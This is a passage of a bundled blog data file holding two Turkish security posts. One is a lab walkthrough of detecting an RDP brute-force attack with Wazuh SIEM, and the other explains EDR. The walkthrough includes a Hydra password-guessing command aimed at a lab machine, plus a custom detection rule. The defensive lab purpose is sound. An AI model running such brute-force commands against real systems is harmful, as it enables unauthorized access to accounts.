indirebilirsiniz. Bu kurulumu yaparak GUI ile veya PowerShell \xfczerinden dok\xfcmanda belirtilen\\\\\\n`.\\\\wazuh-agent-4.11.2-1.msi /q WAZUH_MANAGER=\\"192.168.28.131\\"` komutu ve ard\u0131ndan\\\\\\n`NET START Wazuh`\\nkomutuyla Windows Server taraf\u0131nda Wazuh Agent servisini aktif hale getirdim.\\n\\n![](media/image17.png)\\n\\n![](media/image18.png)\\n\\nServisler k\u0131sm\u0131ndan kontrol etti\u011fimde \xe7al\u0131\u015f\u0131r durumda g\xf6z\xfck\xfcyor. \u0130ki makinenin haberle\u015fti\u011finden emin olmak i\xe7in ping at\u0131yorum.\\n\\n![](media/image19.png)\\n\\n![](media/image20.png)\\n\\nWazuh aray\xfcz\xfcne tekrar d\xf6nd\xfc\u011f\xfcm\xfczde makine ba\u011fl\u0131 \u015fekilde g\xf6z\xfck\xfcyor.\\n\\n## 4. Brute-Force Sald\u0131r\u0131s\u0131 \u0130\xe7in Alert (Uyar\u0131) Olu\u015fturma ve \u0130nceleme\\n\\nWazuh, Windows Server \xfczerindeki brute-force sald\u0131r\u0131lar\u0131n\u0131 alg\u0131lamak i\xe7in varsay\u0131lan olarak kural ID 60122\'yi kullan\u0131r. Bu kural, Windows Security logundaki olay kimlikleri 4625 ve 529\'u (ba\u015far\u0131s\u0131z oturum a\xe7ma giri\u015fimleri) izler. Dolay\u0131s\u0131yla hem manuel olarak hem de Wazuh Dashboard \xfczerinden ilgili kural\u0131 kontrol ettim.\\n\\n![](media/image21.png)\\n\\nWazuh \xfczerinde varsay\u0131lan kurulum halinde ilgili kural aktif gelmi\u015f g\xf6z\xfck\xfcyor.\\n\\nAyn\u0131 zamanda `sudo nano /var/ossec/ruleset/rules/0580-win-security_rules.xml` komutuyla da kontrol ettim.\\n\\n![](media/image22.png)\\n\\nWindows Server \xfczerinde `notepad \\"C:\\\\Program Files (x86)\\\\ossec-agent\\\\ossec.conf\\"` konumundaki \\"ossec.conf\\" dosyas\u0131ndaki **`<localfile\\\\>`** k\u0131s\u0131mlar\u0131n\u0131 kontrol ediyoruz. Yetki gerektirdi\u011fi i\xe7in \\nPowerShell\'i **y\xf6netici** olarak ba\u015flat\u0131n.\\n\\n![](media/image23.png)\\n\\n![](media/image24.png)\\n\\nArt\u0131k emin oldu\u011fumuza g\xf6re sald\u0131r\u0131 i\xe7in `sudo apt install -y hydra` komutuyla Hydra arac\u0131n\u0131 indirerek devam edelim.\\n\\nBu a\u015famada \\"passwords.txt\\" ad\u0131nda bir dosya olu\u015fturup rastgele \u015fifreler yazabilirsiniz veya haz\u0131r listenizi kullanabilirsiniz. Hedef makinenin IP\'si 192.168.28.129 oldu\u011fu i\xe7in\\\\\\n`sudo hydra -l randomuser -P passwords.txt rdp://192.168.28.129` komutu ile Remote Desktop Protokol\xfc\'ne bir sald\u0131r\u0131 deniyoruz. Ar\u0131ndan Wazuh aray\xfcz\xfcn\xfc kontrol edelim.\\n\\n![](media/image25.png)\\n\\nAray\xfcz\xfcn anasayfas\u0131ndaki Medium k\u0131sm\u0131na t\u0131klayarak ilgili Discover sayfas\u0131na gidelim.\\n\\n![](media/image26.png)\\n\\nVe Alert k\u0131sm\u0131nda bir deneme oldu\u011funu g\xf6r\xfcyoruz. T\u0131klay\u0131p detaylar\u0131na bakt\u0131\u011f\u0131mda sald\u0131r\u0131 denemesinin i\xe7eri\u011fi net olarak anla\u015f\u0131l\u0131yor.\\n\\n![](media/image27.png)\\n\\n![](media/image28.png)\\n\\nAyr\u0131ca Wazuh Threat Hunting sekmesinde de Authentication failure olarak denemeler g\xf6z\xfck\xfcyor.\\n\\nDaha detayl\u0131 incelemek i\xe7in Events k\u0131sm\u0131na ge\xe7tim. Burada g\xf6rd\xfc\u011f\xfcm\xfcz \xfczere **\\\\\\"Logon Failure - Unknown user or bad password\\\\\\" 60122** ve **\\\\\\"Multiple Windows Logon Failures\\\\\\" 60204** alertleri belirmi\u015f. Seviye olarak \xe7o\u011funlukla 5. Seviye yani orta d\xfczey kabul ediliyor.\\n\\n![](media/image29.png)\\n\\n## 5. \xd6zel Kural\u0131 Sonradan Eklemek\\n\\nE\u011fer Wazuh \xfczerinde ilgili kural olmasayd\u0131, sonradan eklemek isteseydik ya da bu kurala ba\u011fl\u0131 bir kural eklemek istedeydik \u015fu ad\u0131mlar\u0131 takip etmemiz gerekirdi:\\n\\n\\n`/var/ossec/ruleset/rules/local_rules.xml` dosyas\u0131na\\n\\n```\\n<rule id=\\\\\\"100001\\\\\\" level=\\\\\\"10\\\\\\"\\\\>\\n\\n<if_sid\\\\>60122\\\\</if_sid\\\\>\\n\\n<options\\\\>no_full_log\\\\</options\\\\>\\n\\n<description\\\\>Brute-Force Sald\u0131r\u0131s\u0131 Tespit Edildi\\\\</description\\\\>\\n\\n</rule\\\\>\\n```\\n\\nKural\u0131n\u0131 ekleyerek ek bir Alert olu\u015fturabiliriz.\\n\\nBu kurallara ek olarak daha \xf6nce bahsetti\u011fim \\"ossec.conf\\" u d\xfczenleyerek e-posta bildirimi de eklenebilir.\\\\\\nDaha sonra kural\u0131n aktif hale gelmesi i\xe7in systemctl restart wazuh-manager komutuyla Wazuh yeniden ba\u015flat\u0131l\u0131r.\\n\\n## De\u011ferlendirme\\n\\nBu raporda genel olarak bir kurulum ve s\xfcre\xe7ten bahsettik. Ubuntu \xfczerinde Wazuh SIEM kullan\u0131larak Windows Server 2019 sistemine yap\u0131lan brute-force sald\u0131r\u0131lar\u0131 ba\u015far\u0131yla alg\u0131land\u0131. Varsay\u0131lan 60122 ve 60204 numaral\u0131 kurallar ile ba\u015far\u0131s\u0131z oturum a\xe7ma giri\u015fimleri tespit edildi. Elde edilen sonu\xe7lar, SIEM sistemlerinin g\xfcvenlik izleme s\xfcre\xe7lerindeki \xf6nemini ve Wazuh\'un bu alandaki etkinli\u011fini g\xf6stermi\u015f oldu.\\n\\n> [Berk Ali Er\xe7elik](https://github.com/berkercelik)"},{"id":"edr-nedir-ve-edr-nasil-calisir","metadata":{"permalink":"/b-log/blog/edr-nedir-ve-edr-nasil-calisir","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2025-05-08/2025-05-08-edr-nedir.md","source":"@site/blog/2025-05-08/2025-05-08-edr-nedir.md","title":"EDR (Endpoint Detection and Response) Nedir? ve EDR Nas\u0131l \xc7al\u0131\u015f\u0131r?","description":"Giri\u015f","date":"2025-05-08T00:00:00.000Z","tags":[{"inline":false,"label":"Siber G\xfcvenlik","permalink":"/b-log/blog/tags/siberguvenlik","description":"G\xfcvenlik a\xe7\u0131klar\u0131, s\u0131zma testleri ve savunma teknikleri"}],"readingTime":5.435,"hasTruncateMarker":true,"authors":[{"name":"Berk Ali Er\xe7elik","title":"Cyber Security & Full Stack Web Dev","url":"https://github.com/berkercelik","page":{"permalink":"/b-log/blog/authors/berkercelik"},"socials":{"github":"https://github.com/berkercelik","linkedin":"https://www.linkedin.com/in/berkaliercelik/"},"imageURL":"https://avatars.githubusercontent.com/u/72663666?v=4","key":"berkercelik"}],"frontMatter":{"slug":"edr-nedir-ve-edr-nasil-calisir","title":"EDR (Endpoint Detection and Response) Nedir? ve EDR Nas\u0131l \xc7al\u0131\u015f\u0131r?","authors":["berkercelik"],"tags":["siberguvenlik"]},"unlisted":false,"prevItem":{"title":"Wazuh ile SIEM Ortam\u0131 Haz\u0131rlama","permalink":"/b-log/blog/wazuh-ile-siem-ortami"}},"content":"## Giri\u015f\\r\\nSiber tehditler, g\xfcn\xfcm\xfcz d\xfcnyas\u0131n\u0131n en b\xfcy\xfck risklerinden biri haline geldi. Ara\u015ft\u0131rmalar, siber su\xe7lar\u0131n k\xfcresel ekonomiye maliyetinin her ge\xe7en y\u0131l artt\u0131\u011f\u0131n\u0131 g\xf6steriyor ve g\xfcnl\xfck hayat\u0131m\u0131zda bunu do\u011frudan hisseti\u011fimiz anlar ya\u015fanabiliyor. Bu durum, kurumlar\u0131n sadece teknolojik savunmalarla de\u011fil, stratejik yakla\u015f\u0131mlarla da g\xfcvenliklerini g\xfc\xe7lendirmesini zorunlu k\u0131l\u0131yor. \u0130\u015fte tam bu noktada,  u\xe7 nokta cihazlar\u0131n\u0131 s\xfcrekli izleyerek tehditleri tespit eden ve h\u0131zl\u0131 m\xfcdahale sa\u011flayan EDR (Endpoint Detection and Response) \xe7\xf6z\xfcmleri devreye giriyor. \x3c!-- truncate --\x3eEDR, u\xe7 nokta cihazlar\u0131n\u0131 s\xfcrekli izleyerek tehditleri tespit eden ve h\u0131zl\u0131 yan\u0131t veren bir siber g\xfcvenlik teknolojisidir. Tam olarak T\xfcrk\xe7eye \u201cU\xe7 nokta tehdit alg\u0131lama ve m\xfcdahale, yan\u0131t\u201d olarak \xe7evirebiliriz. Bu yaz\u0131da, EDR\u2019nin ne oldu\u011funu, nas\u0131l \xe7al\u0131\u015ft\u0131\u011f\u0131n\u0131, avantajlar\u0131n\u0131, kullan\u0131m alanlar\u0131n\u0131, zorluklar\u0131n\u0131 ve gelece\u011fini detayl\u0131 bir \u015fekilde inceleyece\u011fiz.\\r\\n\\r\\n## EDR Nedir?\\r\\nU\xe7 Nokta Alg\u0131lama ve Yan\u0131t (EDR), son kullan\u0131c\u0131 cihazlar\u0131n\u0131 (masa\xfcst\xfc bilgisayarlar, diz\xfcst\xfc bilgisayarlar, ak\u0131ll\u0131 telefonlar, sunucular) s\xfcrekli izleyen ve bu cihazlarda ortaya \xe7\u0131kabilecek siber tehditleri tespit edip yan\u0131t veren bir g\xfcvenlik \xe7\xf6z\xfcm\xfcd\xfcr. 2013 y\u0131l\u0131nda Gartner analisti \\r\\nAnton Chuvakin taraf\u0131ndan tan\u0131mlanan EDR, g\xfcn\xfcm\xfczde siber g\xfcvenlikte standart bir teknoloji haline gelmi\u015ftir.\\r\\n### EDR\u2019nin temel bile\u015fenleri \u015funlard\u0131r:\\r\\n- **Ajanlar (Agents):** Her u\xe7 noktaya y\xfcklenen hafif yaz\u0131l\u0131mlar, cihaz etkinliklerini izler ve veri toplar.\\r\\n- **Merkezi Y\xf6netim Konsolu (Centralized Management Console):** G\xfcvenlik ekiplerinin tehditleri g\xf6r\xfcnt\xfcledi\u011fi, analiz etti\u011fi ve yan\u0131t verdi\u011fi platform.\\r\\n- **Tehdit \u0130stihbarat\u0131 (Threat Intelligence):** En son sald\u0131r\u0131 vekt\xf6rleri ve tehdit g\xf6stergeleri (IOC\u2019ler, Indicator of Compromise) hakk\u0131nda g\xfcncel bilgi sa\u011flayan entegrasyonlar.\\r\\n- **Yan\u0131t Yetenekleri (Response Capabilities):** Tehditleri izole etmek, karantinaya almak ve olaylar\u0131 d\xfczeltmek i\xe7in otomatik ve manuel ara\xe7lar.\\r\\n\\r\\n### EDR\u2019nin geleneksel g\xfcvenlik \xe7\xf6z\xfcmlerine (antivir\xfcs, g\xfcvenlik duvar\u0131) g\xf6re avantajlar\u0131 :\\r\\n- **S\xfcrekli \u0130zleme:** 7/24 u\xe7 nokta etkinliklerini izler, gizli tehditleri tespit eder.\\r\\n- **Davran\u0131\u015f Analizi:** Bilinmeyen tehditleri, anormal davran\u0131\u015flar\u0131 analiz ederek bulur.\\r\\n- **Olay Yan\u0131t\u0131:** Tehditleri yaln\u0131zca tespit etmekle kalmaz, h\u0131zl\u0131 m\xfcdahale sa\u011flar.\\r\\n- **Adli Analiz:** Olay sonras\u0131 analiz i\xe7in detayl\u0131 veri sunar, gelecekteki sald\u0131r\u0131lar\u0131 \xf6nlemeye yard\u0131mc\u0131 olur.\\r\\n\\r\\n## EDR\u2019nin Evrimi\\r\\nEDR, 2013\u2019te terim haline gelse de 2010\u2019lar\u0131n ba\u015f\u0131nda geleneksel antivir\xfcs \xe7\xf6z\xfcmlerine bir alternatif olarak ortaya \xe7\u0131kt\u0131. Bir s\xfcre sonra EDR, \xe7\xf6z\xfcmleri yaln\u0131zca tehditleri tespit etmekle kalm\u0131yor, ayn\u0131 zamanda sald\u0131r\u0131 zincirine (Cyber Kill Chain) dair detayl\u0131 bilgiler sunarak g\xfcvenlik ekiplerinin daha etkili yan\u0131t vermesini sa\u011fl\u0131yordu.\\r\\nEDR\u2019nin evrimindeki bir sonraki ad\u0131m, Geni\u015fletilmi\u015f Alg\u0131lama ve Yan\u0131t (XDR) oldu. XDR (Extended Detection and Response), u\xe7 noktalar\u0131n daha da \xf6n\xfcnde yer alarak a\u011f, bulut ve \\r\\ne-posta gibi di\u011fer g\xfcvenlik alanlar\u0131n\u0131 da kapsar. Birden fazla kaynaktan veri toplayarak daha b\xfct\xfcnc\xfcl bir tehdit g\xf6r\xfcn\xfcm\xfc sunar ve daha h\u0131zl\u0131, koordineli yan\u0131tlar sa\u011flar. Bug\xfcn, EDR ve XDR, geleneksel g\xfcvenlik ara\xe7lar\u0131n\u0131n g\xf6zden ka\xe7\u0131rabilece\u011fi geli\u015fmi\u015f tehditleri tespit etmek, ara\u015ft\u0131rmak ve yan\u0131t vermek i\xe7in modern siber g\xfcvenlik stratejilerinde aktif olarak kullan\u0131lan teknolojilerdir.\\r\\n\\r\\n## EDR Nas\u0131l \xc7al\u0131\u015f\u0131r?\\r\\nEDR, u\xe7 noktalara y\xfcklenen bir ajan arac\u0131l\u0131\u011f\u0131yla \xe7al\u0131\u015f\u0131r. Bu ajan, cihazda ger\xe7ekle\u015fen t\xfcm etkinlikleri kaydeder ve merkezi bir sunucuya iletir. Sunucu, bu verileri analiz ederek \u015f\xfcpheli davran\u0131\u015flar\u0131 veya tehditleri tespit eder ve gerekli m\xfcdahaleleri koordine eder. EDR\u2019nin \xe7al\u0131\u015fma s\xfcreci \u015fu ad\u0131mlarla ger\xe7ekle\u015fir:\\r\\n1.\\tVeri Toplama: U\xe7 noktadaki etkinlikler (dosya eri\u015fimleri, oturum ba\u015flatmalar\u0131, a\u011f ba\u011flant\u0131lar\u0131, kay\u0131t defteri de\u011fi\u015fiklikleri) s\xfcrekli olarak kaydedilir. Bu veriler, sistem s\xfcre\xe7leri, kullan\u0131c\u0131 davran\u0131\u015flar\u0131 ve a\u011f trafi\u011fi gibi geni\u015f bir yelpazeyi kapsar.\\r\\n2.\\tVeri Analizi: Toplanan veriler, makine \xf6\u011frenimi modelleri, davran\u0131\u015f analizi ve tehdit istihbarat\u0131 veri tabanlar\u0131 kullan\u0131larak sunucularda incelenir. Normal davran\u0131\u015flardan sapmalar veya bilinen tehdit g\xf6stergeleri aran\u0131r. Yaz\u0131n\u0131n devam\u0131ndaki gibi, bir dosyan\u0131n ola\u011fand\u0131\u015f\u0131 bir \u015fekilde \u015fifrelenmesi fidye yaz\u0131l\u0131m\u0131 belirtisi olabilir. Veya ola\u011fan d\u0131\u015f\u0131 kaynak (RAM, disk, i\u015flemci) kullan\u0131m\u0131 da tehdit belirtisi olabilir.\\r\\n3.\\tTehdit Alg\u0131lama: \u015e\xfcpheli bir etkinlik tespit edilirse (\xf6rnek olarak bir uygulaman\u0131n yetkisiz a\u011f ba\u011flant\u0131s\u0131 kurmas\u0131), bu bir tehdit olarak i\u015faretlenir ve g\xfcvenlik ekiplerine bir uyar\u0131 g\xf6nderilir.\\r\\n4.\\tTehdit Yan\u0131t\u0131: Tespit edilen tehdit otomatik olarak karantinaya al\u0131nabilir (\xf6rne\u011fin, \u015f\xfcpheli bir dosya izole edilir) veya g\xfcvenlik ekibi taraf\u0131ndan manuel olarak incelenir. Gerekirse cihaz a\u011fdan izole edilir veya sistem temizlenir.\\r\\n5.\\tRaporlama ve \u0130zleme: T\xfcm olaylar kaydedilir ve g\xfcvenlik ekiplerine detayl\u0131 raporlar sunulur. Bu raporlar, olay\u0131n kapsam\u0131n\u0131, etkisini ve nas\u0131l \xf6nlenebilece\u011fini anlamak i\xe7in kullan\u0131l\u0131r.\\r\\n\\r\\n### \xd6rnek Senaryo: Fidye Yaz\u0131l\u0131m\u0131 Sald\u0131r\u0131s\u0131\\r\\n\u015eirketteki bir \xe7al\u0131\u015fan\u0131n yanl\u0131\u015fl\u0131kla zararl\u0131 bir e-posta ekini a\xe7t\u0131\u011f\u0131n\u0131 d\xfc\u015f\xfcnelim. Bu ek, bir fidye yaz\u0131l\u0131m\u0131 i\xe7eriyor ve \xe7al\u0131\u015fan\u0131n cihaz\u0131ndaki dosyalar\u0131 \u015fifrelemeye ba\u015fl\u0131yor. EDR sistemi, bu ola\u011fand\u0131\u015f\u0131 dosya \u015fifreleme etkinli\u011fini tespit eder. Davran\u0131\u015f analizi sayesinde, sistem bu etkinli\u011fin normal olmad\u0131\u011f\u0131n\u0131 belirler ve fidye yaz\u0131l\u0131m\u0131n\u0131 karantinaya al\u0131r. Ayn\u0131 anda, g\xfcvenlik ekibine bir uyar\u0131 g\xf6nderilir. Ekip, sald\u0131r\u0131n\u0131n kayna\u011f\u0131n\u0131 ve etkilenen dosyalar\u0131 analiz eder. Bu h\u0131zl\u0131 m\xfcdahale, fidye yaz\u0131l\u0131m\u0131n\u0131n a\u011fda yay\u0131lmas\u0131n\u0131 \xf6nler ve veri kayb\u0131n\u0131 en aza indirir. D\xfczenli yedek al\u0131nan bir \u015firkette durum en az zararla atlatabilir.\\r\\n\\r\\n## Kullan\u0131m Alanlar\u0131\\r\\nEDR \xe7\xf6z\xfcmleri g\xfcn\xfcm\xfczde her sekt\xf6rde veri g\xfcvenli\u011fini sa\u011flamak i\xe7in vazge\xe7ilmez hale gelmi\u015ftir. Finans sekt\xf6r\xfcnde m\xfc\u015fteri verileri ve i\u015flemleri korurken, sa\u011fl\u0131k alan\u0131nda hasta bilgilerini g\xfcvence alt\u0131na al\u0131r. Enerji sekt\xf6r\xfcnde kritik altyap\u0131lar\u0131, perakendede ise m\xfc\u015fteri ve \xf6deme verilerini korur. E\u011fitim kurumlar\u0131, \xf6\u011frenci kay\u0131tlar\u0131 ve ara\u015ft\u0131rma verileri i\xe7in EDR\'ye g\xfcvenirken, h\xfck\xfcmet kurumlar\u0131 vatanda\u015f bilgilerini ve ulusal g\xfcvenli\u011fi korumak i\xe7in EDR \xe7\xf6z\xfcmlerinden yararlan\u0131r. Siber tehditlerin i\u015fletme b\xfcy\xfckl\xfc\u011f\xfc g\xf6zetmeksizin herkesi hedef almas\u0131 nedeniyle, EDR hem b\xfcy\xfck hem de k\xfc\xe7\xfck ve orta \xf6l\xe7ekli i\u015fletmeler i\xe7in b\xfcy\xfck \xf6neme sahiptir.\\r\\n\\r\\n&nbsp;\\r\\n![Alternatif metin](edr.png)\\r\\n\\r\\n**EDR\u2019nin \xe7al\u0131\u015fma mant\u0131\u011f\u0131n\u0131 bir g\xf6rsel ile ifade etmek istedim.**\\r\\n\\r\\n## EDR\u2019nin Zorluklar\u0131 ve K\u0131s\u0131tlamalar\u0131\\r\\n- **Yanl\u0131\u015f Pozitifler:** EDR sistemleri, asl\u0131nda tehdit olmayan etkinlikleri tehdit olarak i\u015faretleyebilir. Bu, g\xfcvenlik ekiplerini yorabilir ve ger\xe7ek tehditlerden dikkatleri da\u011f\u0131tabilir.\\r\\n- **Nitelikli Personel Gereksinimi:** EDR\u2019nin etkili bir \u015fekilde kullan\u0131lmas\u0131 i\xe7in, uyar\u0131lar\u0131 yorumlayabilecek, olaylar\u0131 ara\u015ft\u0131rabilecek ve uygun \u015fekilde yan\u0131t verebilecek nitelikli g\xfcvenlik personeline ihtiya\xe7 vard\u0131r. \\r\\n- **Maliyet:** EDR \xe7\xf6z\xfcmleri, \xf6zellikle k\xfc\xe7\xfck ve orta \xf6l\xe7ekli i\u015fletmeler i\xe7in maliyetli olabilir. Yaz\u0131l\u0131m maliyetlerinin yan\u0131 s\u0131ra da\u011f\u0131t\u0131m, y\xf6netim, elde edilen verileri depolama ve bak\u0131m i\xe7in ek kaynaklar gerekebilir.\\r\\n\\r\\n## EDR\u2019nin Gelece\u011fi\\r\\n- **XDR Entegrasyonu:** Yukar\u0131da bahsetti\u011fim Geni\u015fletilmi\u015f Alg\u0131lama ve Yan\u0131t (XDR), EDR\u2019nin bir evrimidir ve u\xe7 noktalar\u0131n yan\u0131 s\u0131ra a\u011flar, bulut ortamlar\u0131 ve di\u011fer kaynaklardan gelen verileri entegre eder. Bu, farkl\u0131 g\xfcvenlik ara\xe7lar\u0131 aras\u0131ndaki silolara son verir ve tek bir platformda tehdit alg\u0131lama ve yan\u0131t sa\u011flar.\\r\\n- **Yapay Zeka ve Makine \xd6\u011frenimi:** AI ve ML, daha do\u011fru tehdit alg\u0131lama, otomatik yan\u0131t eylemleri ve gelecekteki sald\u0131r\u0131lar\u0131 tahmin etmek i\xe7in analitik ara\xe7lar sa\u011flayarak EDR\u2019de giderek daha \xf6nemli bir rol oynayacak.\\r\\n- **S\u0131f\u0131r G\xfcven Modeli (Zero Trust):** Hi\xe7bir kullan\u0131c\u0131ya, cihaza veya uygulamaya do\u011frudan g\xfcvenilmeyen Zero Trust yakla\u015f\u0131m\u0131nda, EDR sistemleri u\xe7 noktalarda s\xfcrekli do\u011frulama ve anl\u0131k tehdit izleme g\xf6revini \xfcstlenecek. B\xf6ylece, siber tehditlere kar\u015f\u0131 katmanl\u0131 bir savunma mekanizmas\u0131 olu\u015fturulacak.\\r\\n\\r\\n## Sonu\xe7\\r\\nEDR, g\xfcn\xfcm\xfcz siber g\xfcvenli\u011finin vazge\xe7ilmez bir par\xe7as\u0131 haline geldi. U\xe7 noktalardaki tehditleri h\u0131zl\u0131ca tespit edip m\xfcdahale ederek, veri g\xfcvenli\u011fi ve i\u015f s\xfcreklili\u011fi i\xe7in olduk\xe7a \xf6nemli bir koruma sa\u011flar. Kendine g\xf6re avantajlar\u0131 ve baz\u0131 k\u0131s\u0131tlamalar\u0131 mecvut. Genel olarak olduk\xe7a geli\u015fmi\u015f ve geli\u015fmeye devam eden bir teknolojiden bahsettik. Gelecekte yapay zeka, XDR ve Zero Trust gibi teknolojilerle EDR\u2019nin \xf6nemi daha da artacak. \\r\\n\\r\\n> [Berk Ali Er\xe7elik](https://github.com/berkercelik)"}]}}')}}]);